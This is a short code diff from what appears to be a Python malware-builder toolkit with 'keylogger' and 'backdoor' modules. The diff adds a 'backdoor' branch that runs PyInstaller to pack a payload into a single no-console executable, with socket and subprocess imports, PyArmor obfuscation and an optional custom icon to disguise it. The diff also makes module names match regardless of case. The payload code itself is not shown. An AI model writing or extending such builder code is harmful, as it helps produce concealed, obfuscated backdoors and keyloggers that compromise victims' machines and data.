@@ -81,7 +81,7 @@ class ModuleUtils(Utils):
 
         payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
         
-        match kwargs["module"]:
+        match str(kwargs["module"]).lower():
             case "keylogger":
                 with open(kwargs["name"], "w", encoding="utf-8") as file:
                     with open(payload_location, 'r', encoding='utf-8') as file1:
@@ -141,6 +141,20 @@ class ModuleUtils(Utils):
                 except Exception as e:
                     self.write(f"ERROR: {str(e)}", type=4)
                     
+            case "backdoor":
+                try:
+                    if OS == "windows":
+                        icon_option = f"--icon={icon_path}" if icon_path else ""
+                        os.system(f"pyinstaller --onefile --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json \
+                                --hidden-import=os --hidden-import=base64 --hidden-import=pyarmor --noconsole --clean {icon_option} .\\dist\\{name}")
+                    else:
+                        icon_option = f"--icon={icon_path}" if icon_path else ""
+                        os.system(f"pyinstaller --onefile --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json \
+                                --hidden-import=os --hidden-import=base64 --hidden-import=pyarmor --noconsole {icon_option} ./dist/{name}")
+                
+                except Exception as e:
+                    self.write(f"ERROR: {str(e)}", type=4)
+                
             case _:
                 raise ValueError(self.write("Invalid module.", level=4))
         
